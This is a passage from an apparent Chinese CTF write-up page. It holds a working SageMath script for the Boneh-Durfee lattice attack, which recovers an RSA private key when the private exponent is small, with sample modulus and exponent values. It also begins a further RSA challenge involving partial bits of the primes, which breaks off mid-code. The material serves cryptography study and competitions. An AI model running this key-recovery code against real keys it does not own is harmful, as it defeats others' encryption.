class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token comment"># if it is affecting even one vector</span>                    <span class="token comment"># we give up on this one</span>                    <span class="token keyword">if</span> BB<span class="token punctuation">[</span>kk<span class="token punctuation">,</span> affected_vector_index<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>                        affected_deeper <span class="token operator">=</span> <span class="token boolean">False</span>                <span class="token comment"># remove both it if no other vector was affected and</span>                <span class="token comment"># this helpful vector is not helpful enough</span>                <span class="token comment"># compared to our unhelpful one</span>                <span class="token keyword">if</span> affected_deeper <span class="token keyword">and</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>bound <span class="token operator">-</span> BB<span class="token punctuation">[</span>affected_vector_index<span class="token punctuation">,</span> affected_vector_index<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>bound <span class="token operator">-</span> BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span> ii<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">print</span> <span class="token string">"* removing unhelpful vectors"</span><span class="token punctuation">,</span> ii<span class="token punctuation">,</span> <span class="token string">"and"</span><span class="token punctuation">,</span> affected_vector_index                    BB <span class="token operator">=</span> BB<span class="token punctuation">.</span>delete_columns<span class="token punctuation">(</span><span class="token punctuation">[</span>affected_vector_index<span class="token punctuation">,</span> ii<span class="token punctuation">]</span><span class="token punctuation">)</span>                    BB <span class="token operator">=</span> BB<span class="token punctuation">.</span>delete_rows<span class="token punctuation">(</span><span class="token punctuation">[</span>affected_vector_index<span class="token punctuation">,</span> ii<span class="token punctuation">]</span><span class="token punctuation">)</span>                    monomials<span class="token punctuation">.</span>pop<span class="token punctuation">(</span>affected_vector_index<span class="token punctuation">)</span>                    monomials<span class="token punctuation">.</span>pop<span class="token punctuation">(</span>ii<span class="token punctuation">)</span>                    BB <span class="token operator">=</span> remove_unhelpful<span class="token punctuation">(</span>BB<span class="token punctuation">,</span> monomials<span class="token punctuation">,</span> bound<span class="token punctuation">,</span> ii<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>                    <span class="token keyword">return</span> BB    <span class="token comment"># nothing happened</span>    <span class="token keyword">return</span> BB <span class="token triple-quoted-string string">"""Returns:* 0,0   if it fails* -1,-1 if `strict=true`, and determinant doesn't bound* x0,y0 the solutions of `pol`"""</span><span class="token keyword">def</span> <span class="token function">boneh_durfee</span><span class="token punctuation">(</span>pol<span class="token punctuation">,</span> modulus<span class="token punctuation">,</span> mm<span class="token punctuation">,</span> tt<span class="token punctuation">,</span> XX<span class="token punctuation">,</span> YY<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    Boneh and Durfee revisited by Herrmann and May        finds a solution if:    * d &lt; N^delta    * |x| &lt; e^delta    * |y| &lt; e^0.5    whenever delta &lt; 1 - sqrt(2)/2 ~ 0.292    """</span>     <span class="token comment"># substitution (Herrman and May)</span>    PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>u<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>ZZ<span class="token punctuation">)</span>    Q <span class="token operator">=</span> PR<span class="token punctuation">.</span>quotient<span class="token punctuation">(</span>x<span class="token operator">*</span>y <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">-</span> u<span class="token punctuation">)</span> <span class="token comment"># u = xy + 1</span>    polZ <span class="token operator">=</span> Q<span class="token punctuation">(</span>pol<span class="token punctuation">)</span><span class="token punctuation">.</span>lift<span class="token punctuation">(</span><span class="token punctuation">)</span>     UU <span class="token operator">=</span> XX<span class="token operator">*</span>YY <span class="token operator">+</span> <span class="token number">1</span>     <span class="token comment"># x-shifts</span>    gg <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> kk <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>mm <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> ii <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>mm <span class="token operator">-</span> kk <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            xshift <span class="token operator">=</span> x<span class="token operator">^</span>ii <span class="token operator">*</span> modulus<span class="token operator">^</span><span class="token punctuation">(</span>mm <span class="token operator">-</span> kk<span class="token punctuation">)</span> <span class="token operator">*</span> polZ<span class="token punctuation">(</span>u<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token operator">^</span>kk            gg<span class="token punctuation">.</span>append<span class="token punctuation">(</span>xshift<span class="token punctuation">)</span>    gg<span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token comment"># x-shifts list of monomials</span>    monomials <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> polynomial <span class="token keyword">in</span> gg<span class="token punctuation">:</span>        <span class="token keyword">for</span> monomial <span class="token keyword">in</span> polynomial<span class="token punctuation">.</span>monomials<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> monomial <span class="token keyword">not</span> <span class="token keyword">in</span> monomials<span class="token punctuation">:</span>                monomials<span class="token punctuation">.</span>append<span class="token punctuation">(</span>monomial<span class="token punctuation">)</span>    monomials<span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment"># y-shifts (selected by Herrman and May)</span>    <span class="token keyword">for</span> jj <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> tt <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> kk <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>floor<span class="token punctuation">(</span>mm<span class="token operator">/</span>tt<span class="token punctuation">)</span> <span class="token operator">*</span> jj<span class="token punctuation">,</span> mm <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            yshift <span class="token operator">=</span> y<span class="token operator">^</span>jj <span class="token operator">*</span> polZ<span class="token punctuation">(</span>u<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token operator">^</span>kk <span class="token operator">*</span> modulus<span class="token operator">^</span><span class="token punctuation">(</span>mm <span class="token operator">-</span> kk<span class="token punctuation">)</span>            yshift <span class="token operator">=</span> Q<span class="token punctuation">(</span>yshift<span class="token punctuation">)</span><span class="token punctuation">.</span>lift<span class="token punctuation">(</span><span class="token punctuation">)</span>            gg<span class="token punctuation">.</span>append<span class="token punctuation">(</span>yshift<span class="token punctuation">)</span> <span class="token comment"># substitution</span>        <span class="token comment"># y-shifts list of monomials</span>    <span class="token keyword">for</span> jj <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> tt <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> kk <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>floor<span class="token punctuation">(</span>mm<span class="token operator">/</span>tt<span class="token punctuation">)</span> <span class="token operator">*</span> jj<span class="token punctuation">,</span> mm <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            monomials<span class="token punctuation">.</span>append<span class="token punctuation">(</span>u<span class="token operator">^</span>kk <span class="token operator">*</span> y<span class="token operator">^</span>jj<span class="token punctuation">)</span>     <span class="token comment"># construct lattice B</span>    nn <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>monomials<span class="token punctuation">)</span>    BB <span class="token operator">=</span> Matrix<span class="token punctuation">(</span>ZZ<span class="token punctuation">,</span> nn<span class="token punctuation">)</span>    <span class="token keyword">for</span> ii <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>nn<span class="token punctuation">)</span><span class="token punctuation">:</span>        BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> gg<span class="token punctuation">[</span>ii<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> jj <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> ii <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span> <span class="token keyword">in</span> gg<span class="token punctuation">[</span>ii<span class="token punctuation">]</span><span class="token punctuation">.</span>monomials<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span> jj<span class="token punctuation">]</span> <span class="token operator">=</span> gg<span class="token punctuation">[</span>ii<span class="token punctuation">]</span><span class="token punctuation">.</span>monomial_coefficient<span class="token punctuation">(</span>monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span><span class="token punctuation">(</span>UU<span class="token punctuation">,</span>XX<span class="token punctuation">,</span>YY<span class="token punctuation">)</span>     <span class="token comment"># Prototype to reduce the lattice</span>    <span class="token keyword">if</span> helpful_only<span class="token punctuation">:</span>        <span class="token comment"># automatically remove</span>        BB <span class="token operator">=</span> remove_unhelpful<span class="token punctuation">(</span>BB<span class="token punctuation">,</span> monomials<span class="token punctuation">,</span> modulus<span class="token operator">^</span>mm<span class="token punctuation">,</span> nn<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token comment"># reset dimension</span>        nn <span class="token operator">=</span> BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> nn <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">"failure"</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span>     <span class="token comment"># check if vectors are helpful</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        helpful_vectors<span class="token punctuation">(</span>BB<span class="token punctuation">,</span> modulus<span class="token operator">^</span>mm<span class="token punctuation">)</span>        <span class="token comment"># check if determinant is correctly bounded</span>    det <span class="token operator">=</span> BB<span class="token punctuation">.</span>det<span class="token punctuation">(</span><span class="token punctuation">)</span>    bound <span class="token operator">=</span> modulus<span class="token operator">^</span><span class="token punctuation">(</span>mm<span class="token operator">*</span>nn<span class="token punctuation">)</span>    <span class="token keyword">if</span> det <span class="token operator">>=</span> bound<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"We do not have det &lt; bound. Solutions might not be found."</span>        <span class="token keyword">print</span> <span class="token string">"Try with highers m and t."</span>        <span class="token keyword">if</span> debug<span class="token punctuation">:</span>            diff <span class="token operator">=</span> <span class="token punctuation">(</span>log<span class="token punctuation">(</span>det<span class="token punctuation">)</span> <span class="token operator">-</span> log<span class="token punctuation">(</span>bound<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> log<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>            <span class="token keyword">print</span> <span class="token string">"size det(L) - size e^(m*n) = "</span><span class="token punctuation">,</span> floor<span class="token punctuation">(</span>diff<span class="token punctuation">)</span>        <span class="token keyword">if</span> strict<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)"</span>     <span class="token comment"># display the lattice basis</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        matrix_overview<span class="token punctuation">(</span>BB<span class="token punctuation">,</span> modulus<span class="token operator">^</span>mm<span class="token punctuation">)</span>     <span class="token comment"># LLL</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"optimizing basis of the lattice via LLL, this can take a long time"</span>     BB <span class="token operator">=</span> BB<span class="token punctuation">.</span>LLL<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"LLL is done!"</span>     <span class="token comment"># transform vector i &amp; j -> polynomials 1 &amp; 2</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"looking for independent vectors in the lattice"</span>    found_polynomials <span class="token operator">=</span> <span class="token boolean">False</span>        <span class="token keyword">for</span> pol1_idx <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>nn <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> pol2_idx <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>pol1_idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> nn<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment"># for i and j, create the two polynomials</span>            PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>w<span class="token punctuation">,</span>z<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>ZZ<span class="token punctuation">)</span>            pol1 <span class="token operator">=</span> pol2 <span class="token operator">=</span> <span class="token number">0</span>            <span class="token keyword">for</span> jj <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>nn<span class="token punctuation">)</span><span class="token punctuation">:</span>                pol1 <span class="token operator">+=</span> monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span><span class="token punctuation">(</span>w<span class="token operator">*</span>z<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>w<span class="token punctuation">,</span>z<span class="token punctuation">)</span> <span class="token operator">*</span> BB<span class="token punctuation">[</span>pol1_idx<span class="token punctuation">,</span> jj<span class="token punctuation">]</span> <span class="token operator">/</span> monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span><span class="token punctuation">(</span>UU<span class="token punctuation">,</span>XX<span class="token punctuation">,</span>YY<span class="token punctuation">)</span>                pol2 <span class="token operator">+=</span> monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span><span class="token punctuation">(</span>w<span class="token operator">*</span>z<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>w<span class="token punctuation">,</span>z<span class="token punctuation">)</span> <span class="token operator">*</span> BB<span class="token punctuation">[</span>pol2_idx<span class="token punctuation">,</span> jj<span class="token punctuation">]</span> <span class="token operator">/</span> monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span><span class="token punctuation">(</span>UU<span class="token punctuation">,</span>XX<span class="token punctuation">,</span>YY<span class="token punctuation">)</span>             <span class="token comment"># resultant</span>            PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>q<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>ZZ<span class="token punctuation">)</span>            rr <span class="token operator">=</span> pol1<span class="token punctuation">.</span>resultant<span class="token punctuation">(</span>pol2<span class="token punctuation">)</span>             <span class="token comment"># are these good polynomials?</span>            <span class="token keyword">if</span> rr<span class="token punctuation">.</span>is_zero<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">or</span> rr<span class="token punctuation">.</span>monomials<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span> <span class="token string">"found them, using vectors"</span><span class="token punctuation">,</span> pol1_idx<span class="token punctuation">,</span> <span class="token string">"and"</span><span class="token punctuation">,</span> pol2_idx                found_polynomials <span class="token operator">=</span> <span class="token boolean">True</span>                <span class="token keyword">break</span>        <span class="token keyword">if</span> found_polynomials<span class="token punctuation">:</span>            <span class="token keyword">break</span>     <span class="token keyword">if</span> <span class="token keyword">not</span> found_polynomials<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"no independant vectors could be found. This should very rarely happen..."</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>        rr <span class="token operator">=</span> rr<span class="token punctuation">(</span>q<span class="token punctuation">,</span> q<span class="token punctuation">)</span>     <span class="token comment"># solutions</span>    soly <span class="token operator">=</span> rr<span class="token punctuation">.</span>roots<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>soly<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"Your prediction (delta) is too small"</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>     soly <span class="token operator">=</span> soly<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    ss <span class="token operator">=</span> pol1<span class="token punctuation">(</span>q<span class="token punctuation">,</span> soly<span class="token punctuation">)</span>    solx <span class="token operator">=</span> ss<span class="token punctuation">.</span>roots<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>     <span class="token comment">#</span>    <span class="token keyword">return</span> solx<span class="token punctuation">,</span> soly <span class="token keyword">def</span> <span class="token function">example</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">############################################</span>    <span class="token comment"># How To Use This Script</span>    <span class="token comment">##########################################</span>     <span class="token comment">#</span>    <span class="token comment"># The problem to solve (edit the following values)</span>    <span class="token comment">#</span>     <span class="token comment"># the modulus</span>    N <span class="token operator">=</span> <span class="token number">0xbadd260d14ea665b62e7d2e634f20a6382ac369cd44017305b69cf3a2694667ee651acded7085e0757d169b090f29f3f86fec255746674ffa8a6a3e1c9e1861003eb39f82cf74d84cc18e345f60865f998b33fc182a1a4ffa71f5ae48a1b5cb4c5f154b0997dc9b001e441815ce59c6c825f064fdca678858758dc2cebbc4d27</span>    <span class="token comment"># the public exponent</span>    e <span class="token operator">=</span> <span class="token number">0x11722b54dd6f3ad9ce81da6f6ecb0acaf2cbc3885841d08b32abc0672d1a7293f9856db8f9407dc05f6f373a2d9246752a7cc7b1b6923f1827adfaeefc811e6e5989cce9f00897cfc1fc57987cce4862b5343bc8e91ddf2bd9e23aea9316a69f28f407cfe324d546a7dde13eb0bd052f694aefe8ec0f5298800277dbab4a33bb</span>     <span class="token comment"># the hypothesis on the private exponent (the theoretical maximum is 0.292)</span>    <span class="token comment">#delta = .18 # this means that d &lt; N^delta</span>    delta <span class="token operator">=</span> <span class="token number">.18</span>    <span class="token comment">#</span>    <span class="token comment"># Lattice (tweak those values)</span>    <span class="token comment">#</span>     <span class="token comment"># you should tweak this (after a first run), (e.g. increment it until a solution is found)</span>    m <span class="token operator">=</span> <span class="token number">4</span> <span class="token comment"># size of the lattice (bigger the better/slower)</span>     <span class="token comment"># you need to be a lattice master to tweak these</span>    t <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">2</span><span class="token operator">*</span>delta<span class="token punctuation">)</span> <span class="token operator">*</span> m<span class="token punctuation">)</span>  <span class="token comment"># optimization from Herrmann and May</span>    X <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">*</span>floor<span class="token punctuation">(</span>N<span class="token operator">^</span>delta<span class="token punctuation">)</span>  <span class="token comment"># this _might_ be too much</span>    Y <span class="token operator">=</span> floor<span class="token punctuation">(</span>N<span class="token operator">^</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># correct if p, q are ~ same size</span>     <span class="token comment">#</span>    <span class="token comment"># Don't touch anything below</span>    <span class="token comment">#</span>     <span class="token comment"># Problem put in equation</span>    P<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token punctuation">,</span>y<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>ZZ<span class="token punctuation">)</span>    A <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token punctuation">(</span>N<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span>    pol <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">+</span> x <span class="token operator">*</span> <span class="token punctuation">(</span>A <span class="token operator">+</span> y<span class="token punctuation">)</span>     <span class="token comment">#</span>    <span class="token comment"># Find the solutions!</span>    <span class="token comment">#</span>     <span class="token comment"># Checking bounds</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"=== checking values ==="</span>        <span class="token keyword">print</span> <span class="token string">"* delta:"</span><span class="token punctuation">,</span> delta        <span class="token keyword">print</span> <span class="token string">"* delta &lt; 0.292"</span><span class="token punctuation">,</span> delta <span class="token operator">&lt;</span> <span class="token number">0.292</span>        <span class="token keyword">print</span> <span class="token string">"* size of e:"</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>log<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token operator">/</span>log<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">"* size of N:"</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>log<span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token operator">/</span>log<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">"* m:"</span><span class="token punctuation">,</span> m<span class="token punctuation">,</span> <span class="token string">", t:"</span><span class="token punctuation">,</span> t     <span class="token comment"># boneh_durfee</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"=== running algorithm ==="</span>        start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>     solx<span class="token punctuation">,</span> soly <span class="token operator">=</span> boneh_durfee<span class="token punctuation">(</span>pol<span class="token punctuation">,</span> e<span class="token punctuation">,</span> m<span class="token punctuation">,</span> t<span class="token punctuation">,</span> X<span class="token punctuation">,</span> Y<span class="token punctuation">)</span>     <span class="token comment"># found a solution?</span>    <span class="token keyword">if</span> solx <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"=== solution found ==="</span>        <span class="token keyword">if</span> <span class="token boolean">False</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">"x:"</span><span class="token punctuation">,</span> solx            <span class="token keyword">print</span> <span class="token string">"y:"</span><span class="token punctuation">,</span> soly         d <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>pol<span class="token punctuation">(</span>solx<span class="token punctuation">,</span> soly<span class="token punctuation">)</span> <span class="token operator">/</span> e<span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">"private key found:"</span><span class="token punctuation">,</span> d    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"=== no solution was found ==="</span>     <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"=== %s seconds ==="</span> <span class="token operator">%</span> <span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start_time<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    example<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="7、-鹤城杯-2021-BabyRSA-已知p的高位和q的低位"><a href="#7、-鹤城杯-2021-BabyRSA-已知p的高位和q的低位" class="headerlink" title="7、[鹤城杯 2021]BabyRSA(已知p的高位和q的低位)"></a>7、[鹤城杯 2021]BabyRSA(已知p的高位和q的低位)</h3><h4 id="题目-6"><a href="#题目-6" class="headerlink" title="题目"></a>题目</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime<span class="token punctuation">,</span> bytes_to_long<span class="token keyword">from</span> secret <span class="token keyword">import</span> flagp <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>n <span class="token operator">=</span> p <span class="token operator">*</span> qe <span class="token operator">=</span> <span class="token number">65537</span>hint1 <span class="token operator">=</span> p <span class="token operator">>></span> <span class="token number">724</span>        <span class="token comment">#p的高位  300</span>hint2 <span class="token operator">=</span> q <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">**</span> <span class="token number">265</span><span class="token punctuation">)</span>  <span class="token comment">#q的低位  759</span>ct <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>hint1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>hint2<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>ct<span class="token 